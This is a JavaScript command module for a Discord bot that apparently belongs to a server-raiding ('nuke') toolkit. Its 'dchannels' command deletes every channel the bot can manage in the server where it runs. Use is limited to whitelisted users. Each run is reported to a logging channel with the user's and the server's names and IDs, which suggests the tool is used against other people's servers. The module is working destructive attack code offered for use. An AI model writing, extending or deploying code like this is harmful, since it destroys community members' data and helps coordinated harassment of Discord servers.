const Discord = require('discord.js');
const db = require('megadb')
const blacklist = new db.crearDB("blacklist")
const serverlist = new db.crearDB("serverlist")
const color = '0x410255'

let cooldown = new Set()

module.exports = {
  name: "deletedchannels",
  alias: ["dchannels"],

execute (client, message, args){

   if(!blacklist.has(message.author.id)){
    const a = new Discord.MessageEmbed()
    .setDescription("You are not registered in the Whitelist.")
    .setColor(color)
     return message.reply({embeds: [a]})
  }

  if (serverlist.tiene(message.guild.id)){
    const serverInListEmbed = new Discord.MessageEmbed()
        .setDescription("<:Converter:995595217782718475> This command is not available in this server.")
        .setColor(color);
      return message.reply({ embeds: [serverInListEmbed] });
    }

  if(!message.guild.me.permissions.has("MANAGE_CHANNELS")){
    const wu = new Discord.MessageEmbed()
    .setDescription("<:Converter:995595217782718475> I don't have permissions. I need the `MANAGE_CHANNELS`.")
   .setColor(color)
   return message.reply({embeds: [wu]})
  }

  if(cooldown.has(message.author.id)){
    const l = new Discord.MessageEmbed()
    .setDescription(`<:Converter:995595217782718475> ${message.author}, you must wait 1 minute to use the command.`)
    .setColor(color)
    return message.author.send({embeds: [l]}).catch(() => console.log(`${user.displayName}'s' DMs are closed | Please use .spam <@User> <message> instead`)) 
  }

  cooldown.add(message.author.id);

  setTimeout(() => {
    cooldown.delete(message.author.id);
  }, 60000);

  try {

  message.guild.channels.cache.forEach((ch) => {
  const botPermissions = ch.permissionsFor(message.guild.me);
    if (botPermissions && botPermissions.has("MANAGE_CHANNELS")) {
      ch.delete().catch((err) => {
        console.log("Error Found: " + err);
      });
    }
  });

  const embok = new Discord.MessageEmbed()
  .setDescription("<:k_:995595248266915870> command ejecuted.")
  .setColor(color)
  message.author.send({embeds: [embok]}).catch(err => {
    console.log(err)
  })

  

  const e = new Discord.MessageEmbed()


   .setDescription(`<:k_:995595248266915870> deleted-channels executed successfully!`)
     .addField("User", `**${message.author.tag}** | **${message.author.id}**`)
    .addField("Server Name", `**${message.guild.name}** | **${message.guild.id}**`)
   .setColor(color)
    .setThumbnail(message.author.displayAvatarURL({format: 'png', dynamic: true}))


   client.channels.cache.get("1186076417142816808").send({embeds: [e]})

} catch (error) {
  const laoo = new Discord.MessageEmbed()
  .setDescription("<:Converter:995595217782718475> Error found")
  .addField("> Command", "`dchannels`", true)
  .addField("> Error", `\`${error}\``, true)
  .setColor("#410255")

  client.channels.cache.get('1210148130264322119').send({embeds: [laoo]})
}


 }

}